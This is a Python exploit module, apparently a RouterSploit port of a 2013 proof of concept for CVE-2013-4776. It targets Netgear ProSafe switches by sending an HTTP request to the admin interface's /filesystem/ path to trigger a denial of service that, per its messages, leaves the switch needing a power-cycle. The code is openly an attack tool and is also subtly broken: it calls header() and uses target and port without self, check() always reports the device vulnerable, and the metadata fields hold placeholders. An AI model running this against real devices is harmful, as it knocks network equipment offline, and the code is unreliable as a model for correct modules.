#!/usr/bin/python

################################################################
#                                                              #
# Netgear ProSafe - CVE-2013-4776 PoC                          #
# written by Juan J. Guelfo @ Encripto AS                      #
# post@encripto.no                                             #
#                                                              #
# Copyright 2013 Encripto AS. All rights reserved.             #
#                                                              #
# This software is licensed under the FreeBSD license.         #
# http://www.encripto.no/tools/license.php                     #
#                                                              #
################################################################

import sys, getopt, urllib.request
from subprocess import *
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient

class Exploit(HTTPClient):

    target = OptIP("", "Target IPv4 or IPv6 address")

    port = OptPort(80, "Target HTTP port")




    __info__ = {

        "name": "CVE-2013-4776",
        "description": "Details of the vulnerability have not been disclosed ",
        "authors": (
            "Juan J. Guelfo, Encripto AS (post@encripto.no)",  # vulnerability discovery
            "###",  # routersploit module
        ),
        "references": (
            "http://www.encripto.no/tools/license.php",
        ),
        "devices": (
            "CVE-2013-4776"
        ),

    }

    __version__ = "0.1"
    __author__ = "Juan J. Guelfo, Encripto AS (post@encripto.no)"


    # Prints title and other header info
    def header(self):
        print_status("")
        print_status(" ================================================================= ")
        print_status("|  Netgear ProSafe - CVE-2013-4776 PoC \t\t\t\t  |".format(self.__version__))
        print_status( "|  by {0}\t\t  |".format(self.__author__))
        print_status( " ================================================================= ")
        print_status( "")

        
    # Prints help    
    def help(self):
        self.header()
        print_status("""
       Usage: python CVE-2013-4776.py [mandatory options]

       Mandatory options:
           -t target               ...Target IP address
           -p port                 ...Port where the HTTP admin interface is listening on
            
       Example:
           python CVE-2013-4776.py -t 192.168.0.1 -p 80
        """)
        #sys.exit(0) 

    
    def run(self):
        if self.check():
            print_success("Target seems to be vulnerable")
    
            #Parse options
            # try:
            #     options, args = getopt.getopt(sys.argv[1:], "t:p:", ["target=", "port="])

            # except getopt.GetoptError, err:
            #     header()
            #     print_status("\n[-] Error: {0}.\n".format(str(err)))
            #     sys.exit(1)
            
            # if not options:
            #     help()
            
            # target = None
            # port = None
            # for opt, arg in options:
            #     if opt in ("-t"):
            #         target = arg
                
            #     if opt in ("-p"):
            #         port = arg    
                    
            #Option input validation
            if self.target and self.port:
                header()
                headers = { "User-Agent" : "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)" }
                try:
                    # Get the startup config via HTTP admin interface
                    print_status(" Triggering DoS condition...")
                    r = urllib.request.Request('http://%s:%s/filesystem/' % (target, port), None, headers)
                    urllib.request.urlopen(r,"",5).read()
            
                except urllib.error.URLError:
                    print_error(" Error: The connection could not be established.\n")
                    
                except:
                    print_error(" The switch should be freaking out...")
                    print_error( " Reboot the switch (unplug the power cord) to get it back to normal...\n")
                
            else:
                help()
                print_error(" Error: Incorrect syntax.\n")
                # sys.exit(1)
            
        else:

            print_error("Exploit failed - target seems to be not vulnerable")

            

            # sys.exit(0)
            
    def check(self):
        
        return True
